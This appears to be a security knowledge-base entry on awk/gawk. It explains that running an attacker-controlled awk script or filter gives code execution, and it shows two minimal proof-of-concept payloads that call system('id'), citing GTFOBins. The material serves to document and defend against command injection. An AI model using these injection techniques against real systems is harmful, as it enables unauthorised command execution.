---
title: awk
tags:
  - cli
  - config-file
  - eval-sh
references: 
- https://www.gnu.org/software/gawk/manual/gawk.html#index-system_0028_0029-function
files: ['*.awk','*.gawk']
---

`awk` or `gawk` is a data-driven scripting language tool with many powerful features.

## Script file

If an attacker-controlled script is used (`-f`), RCE is possible:

`script.awk`

```awk
END {
     system("id")
}
```

## Injection

If an attacker controls the awk filter, RCE is achieved. See [GTFOBins](https://gtfobins.github.io/gtfobins/gawk/#shell):

```sh
gawk 'BEGIN {system("id")}' any.txt
```
